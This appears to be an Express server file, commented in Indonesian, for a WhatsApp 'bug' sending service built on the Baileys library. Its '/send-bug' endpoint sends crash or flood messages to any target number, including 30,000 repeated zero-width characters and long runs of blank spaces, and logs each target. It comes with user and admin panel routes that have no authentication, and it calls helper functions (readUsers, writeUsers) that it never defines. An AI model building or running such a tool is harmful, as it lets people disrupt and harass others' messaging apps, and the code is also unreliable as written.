const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const startBot = require('./baileys');

const app = express();
const PORT = 3000;

app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));

// Load users
let users = JSON.parse(fs.readFileSync('./users.json'));

// Start Baileys Bot
let sock;
(async () => {
  sock = await startBot();
})();

// 📌 === Fungsi logToFile diletakkan DI SINI ===
function logToFile(data) {
  const logs = fs.existsSync('logs.json') ? JSON.parse(fs.readFileSync('logs.json')) : [];
  logs.push(data);
  fs.writeFileSync('logs.json', JSON.stringify(logs, null, 2));
}

// 💣 Kirim Bug WA
app.post('/send-bug', async (req, res) => {
  const { target, type, sender } = req.body;

  const bugMsg = {
    force1: '💣 FORCE 1 MSG',
    invisible: '\u200B\u200C\u200D\u2060\uFEFF'.repeat(30000),
    blankwa: ' '.repeat(5000),
    ios: '🍎 iOS bug attack!'
  };

  try {
    await sock.sendMessage(`${target}@s.whatsapp.net`, { text: bugMsg[type] });
    logToFile({ target, type, sender, status: 'success', time: new Date() });
    res.json({ success: true });
  } catch (err) {
    logToFile({ target, type, sender, status: 'failed', time: new Date() });
    res.status(500).json({ success: false });
  }
});

// 🧩 Dashboard Routes
app.get('/logs', (req, res) => {
  const logs = fs.existsSync('logs.json') ? JSON.parse(fs.readFileSync('logs.json')) : [];
  res.json(logs);
});

app.get('/users', (req, res) => {
  res.json(users.map(u => u.username));
});

// Tambah user baru (hanya dari admin panel)
app.post('/admin/add-user', (req, res) => {
  const { username, password } = req.body;
  let users = readUsers();

  if (users.find(u => u.username === username)) {
    return res.status(400).json({ error: "Username sudah ada." });
  }

  users.push({
    username,
    password,
    active: false,
    blocked: false,
    lastLogin: null,
    loginDays: 0
  });

  writeUsers(users);
  res.json({ success: true });
});

// Unblock user
app.post('/admin/unblock', (req, res) => {
  const { username } = req.body;
  let users = readUsers();
  let user = users.find(u => u.username === username);

  if (!user) return res.status(404).json({ error: "User tidak ditemukan." });
  user.blocked = false;
  writeUsers(users);
  res.json({ success: true });
});

// Start server
app.listen(PORT, () => {
  console.log(`✅ Server running at http://localhost:${PORT}`);
});